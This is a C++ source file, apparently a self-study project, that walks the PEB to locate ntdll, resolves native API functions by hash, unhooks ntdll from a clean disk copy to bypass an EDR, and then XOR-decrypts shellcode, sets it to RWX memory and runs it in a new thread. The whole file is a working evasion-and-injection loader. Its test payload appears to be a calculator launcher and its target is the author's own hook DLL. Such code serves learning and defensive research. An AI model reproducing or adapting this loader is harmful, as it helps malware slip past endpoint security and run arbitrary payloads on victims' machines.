/*
This program is designed to help me practice parsing the PEB and other critical data structures to find and manipulate data as needed
// Let's try to bypass our custom EDR by unhooking the "hooked" NTDLL with a clean copy from disk
*/
// Includes
#include <wchar.h>
#include <Windows.h>
#include <winnt.h>
#include <cstdio>
#include <intrin.h>
#include <iostream>
#include <sstream>
#include <winternl.h>
#include "Globals.h"
#include "Djb2.h"
#include "XOR.h"
#include "Stuff.h"
#include "syscall_resolver.h"
#include "Unmapper.h"
#include <iomanip>


// ntWalker is sort of our do-it-all function that finds the base address of ntdll for us
DWORD ntWalker() {
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = __readfsdword(0x30);
#else
#error Unsupported Platform
#endif
	
	// TODO: Walk Ldr Doubly Linked List to find ntdll
	PPEB_LDR_DATA pLdr = pPeb->Ldr;
	PLIST_ENTRY pLdrListEntry = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY pCurr = pLdrListEntry->Flink;
	while (pCurr != pLdrListEntry) {
		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		PWCHAR fullPath = pEntry->FullDllName.Buffer;
		PWCHAR fileName = wcsrchr(fullPath, L'\\');
		fileName = (fileName != nullptr) ? fileName + 1 : fullPath;
		DWORD dllHash = Djb2HashMaker(fileName);
		if (dllHash == NTDLL_HASH) {
			g_ntBase = pEntry->DllBase;
			break;
		}
		pCurr = pCurr->Flink;
	}
		
	// Error checking
	if (g_ntBase == NULL) {
		std::cerr << "Module Base Address is still null/invalid" << std::endl;
		return -1;
	}


 // Uncomment above to enable EDR evasion via UNHOOKING NTDLL
 

	/*
	typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA from base of image
    DWORD   AddressOfNames;         // RVA from base of image
    DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
*/

/////////////IMAGE DOS HEADER///////////////

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)g_ntBase;
	// Sig Check
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cerr << "Invalid DOS Signature!" << std::endl;
		return -1;
	}

	/*
	/////////////IMAGE NT HEADER///////////////
	*/
	// NT HEADER = Base + DOS_HDR->e_lfanew
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)g_ntBase + pImgDosHdr->e_lfanew);
	// Sig Check
	if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		std::cerr << "Invalid NT Signature!" << std::endl;
		return -1;
	}

	/////////////IMAGE OPTIONAL HEADER///////////////
	PIMAGE_OPTIONAL_HEADER pImgOptHdr = &pImgNtHdr->OptionalHeader;


	PIMAGE_EXPORT_DIRECTORY pNtExpDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)g_ntBase + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // EAT
	// TODO: Walk the EAT
	// Define Array Pointers for Function Names | Function Addresses | Function Ordinal Numbers
	PDWORD fnNameArray = (PDWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfNames);
	PDWORD fnAddrArray = (PDWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfFunctions);
	PWORD fnOrdinalArray = (PWORD)((PBYTE)g_ntBase + pNtExpDir->AddressOfNameOrdinals);

	for (DWORD i{ 0 }; i < pNtExpDir->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)((PBYTE)g_ntBase + fnNameArray[i]);
		WORD wFuncOrdinal = fnOrdinalArray[i];
		PVOID pFuncAddr = (PVOID)((PBYTE)g_ntBase + fnAddrArray[wFuncOrdinal]);
		wchar_t wideName[256];
		MultiByteToWideChar(CP_UTF8, 0, pFuncName, -1, wideName, 256);
		// Djb2 Hash each function name
		DWORD fnHash = Djb2HashMaker(wideName);
		if (fnHash == NTALLOCATEVIRTMEM_HASH) {
			g_NtAlloc = (pNtAllocateVirtualMem)pFuncAddr;
		}
		else if (fnHash == NTWRITEVIRTMEM_HASH) {
			g_NtWrite = (pNtWriteVirtualMem)pFuncAddr;
		}
		else if (fnHash == NTPROTECTVIRTMEM_HASH) {
			g_NtProtect = (pNtProtectVirtualMem)pFuncAddr;
		}
		else if (fnHash == NTCREATETHREADEX_HASH) {
			g_NtThread = (pNtCreateThreadEx)pFuncAddr;
		}
		else {
			continue;
		}
	}
	if (g_NtAlloc == NULL || g_NtProtect == NULL || g_NtWrite == NULL || g_NtThread == NULL) {
		std::cerr << "Memory addresses were not populated successfully" << std::endl;
		return -1;
	}


	// First attempt to resolve SSN's
	// Call stubFinder for all functions we found base addresses for
	ntAllocSSN = stubFinder(g_NtAlloc);
	// Check if we are hooked
	if (ntAllocSSN == -1) {
		std::cout << ATTEMPT << std::endl; // recursively call with new base
	}
	ntWriteSSN = stubFinder(g_NtWrite);
	if (ntWriteSSN == -1) {
		std::cout << ATTEMPT << std::endl;
	}
	ntProtectSSN = stubFinder(g_NtProtect);
	if (ntProtectSSN == -1) {
		std::cout << ATTEMPT << std::endl;
	}
	ntThreadSSN = stubFinder(g_NtThread);
	if (ntThreadSSN == -1) {
		std::cout << ATTEMPT << std::endl;
	}

	// Call unmapper function which should update g_ntBase to the clean copy
	ntUnmapper();
	// Need to rewalk EAT with newBase or CLEAN NTDLL
	PIMAGE_DOS_HEADER pNewImgDosHdr = (PIMAGE_DOS_HEADER)g_ntBase;
	// Sig Check
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		std::cerr << "Invalid DOS Signature!" << std::endl;
		return -1;
	}
	PIMAGE_NT_HEADERS pNewImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)g_ntBase + pNewImgDosHdr->e_lfanew);
	// Sig Check
	if (pNewImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		std::cerr << "Invalid NT Signature!" << std::endl;
		return -1;
	}

	/////////////IMAGE OPTIONAL HEADER///////////////
	PIMAGE_OPTIONAL_HEADER pNewImgOptHdr = &pNewImgNtHdr->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY pNewNtExpDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)g_ntBase + pNewImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // EAT
	// TODO: Walk the EAT
	// Define Array Pointers for Function Names | Function Addresses | Function Ordinal Numbers
	PDWORD fnNewNameArray = (PDWORD)((PBYTE)g_ntBase + pNewNtExpDir->AddressOfNames);
	PDWORD fnNewAddrArray = (PDWORD)((PBYTE)g_ntBase + pNewNtExpDir->AddressOfFunctions);
	PWORD fnNewOrdinalArray = (PWORD)((PBYTE)g_ntBase + pNewNtExpDir->AddressOfNameOrdinals);

	for (DWORD i{ 0 }; i < pNewNtExpDir->NumberOfFunctions; i++) {
		CHAR* pNewFuncName = (CHAR*)((PBYTE)g_ntBase + fnNewNameArray[i]);
		WORD wNewFuncOrdinal = fnNewOrdinalArray[i];
		PVOID pNewFuncAddr = (PVOID)((PBYTE)g_ntBase + fnNewAddrArray[wNewFuncOrdinal]);
		wchar_t newwideName[256];
		MultiByteToWideChar(CP_UTF8, 0, pNewFuncName, -1, newwideName, 256);
		// Djb2 Hash each function name
		DWORD fnHash = Djb2HashMaker(newwideName);
		if (fnHash == NTALLOCATEVIRTMEM_HASH) {
			g_NtAlloc = (pNtAllocateVirtualMem)pNewFuncAddr;
		}
		else if (fnHash == NTWRITEVIRTMEM_HASH) {
			g_NtWrite = (pNtWriteVirtualMem)pNewFuncAddr;
		}
		else if (fnHash == NTPROTECTVIRTMEM_HASH) {
			g_NtProtect = (pNtProtectVirtualMem)pNewFuncAddr;
		}
		else if (fnHash == NTCREATETHREADEX_HASH) {
			g_NtThread = (pNtCreateThreadEx)pNewFuncAddr;
		}
		else {
			continue;
		}
	}
	if (g_NtAlloc == NULL || g_NtProtect == NULL || g_NtWrite == NULL || g_NtThread == NULL) {
		std::cerr << "Memory addresses were not populated successfully" << std::endl;
		return -1;
	}
	// SHould no longer be hooked
	ntAllocSSN = stubFinder(g_NtAlloc);
	ntWriteSSN = stubFinder(g_NtWrite);
	ntProtectSSN = stubFinder(g_NtProtect);
	ntThreadSSN = stubFinder(g_NtThread);
	
	// Now our global vars should be populated and we can invoke direct syscalls via ASM


	// Now we will call our shellcode injection functions
	
	// Init Vars for NT syscalls
	NTSTATUS Status = 0x00;
	ULONG uOldProtect = NULL;
	SIZE_T szPayloadSize = sizeof(calc);
	SIZE_T szNumBytesWritten = NULL;
	HANDLE hThread = NULL;
	PVOID pAddress = NULL;

	// XOR Payload - Now
	PBYTE pEncryptedPayload = XorPayload(calc, szPayloadSize, 0x9A); // Change key per run

	// Call NtAllocateVirtualMemory
	NTSTATUS status = NtAlloc((HANDLE)-1, // We will test our Custom EDR to see if this still hooks
		&pAddress,
		0,
		&szPayloadSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	if (NT_SUCCESS(status)) {
		std::cout << "Memory Allocated at: 0x" << std::hex << pAddress << std::endl;
	}
	else {
		std::cerr << "NtAllocateVirtualMemory Failed with error: 0x" << std::hex << status << std::endl;
		return 1;
	}

	// Call NtWriteProcessMemory
	NTSTATUS status_write = NtWrite((HANDLE)-1, pAddress, pEncryptedPayload, szPayloadSize, &szNumBytesWritten);
	if (NT_SUCCESS(status_write)) {
		std::cout << "Successfully wrote payload to memory" << std::endl;
	}
	else {
		std::cerr << "NtWriteProcessMemory failed with error: 0x" << std::hex << status_write << std::endl;
		return 1;
	}

	// Call NtProtectVirtualMemory
	NTSTATUS status_prot = NtProtect((HANDLE)-1, &pAddress, &szPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
	if (NT_SUCCESS(status_prot)) {
		std::cout << "Successfully updated memory permissions to RWX" << std::endl;
	}
	else {
		std::cerr << "NtProtectVirtualMemory failed with error: 0x" << std::hex << status_prot << std::endl;
		return 1;
	}

	std::cout << "Press Enter to decrypt and execute payload..." << std::endl;
	getchar();
	XorPayload((unsigned char*)pAddress, szPayloadSize, 0x9A);

	// Call NtCreateThreadEx
	NTSTATUS status_thread = NtThread(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(status_thread)) {
		std::cerr << "NtCreateThreadEx failed with error: 0x" << std::hex << status_thread << std::endl;
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);

	return 0;
}
int main() {

	HMODULE hMod = LoadLibrary(L"fHooks.dll");
	if (hMod == NULL) {
		std::cout << "Could not load EDR" << std::endl;
		return 1;
	}
	
	ntWalker();
	return 0;
}
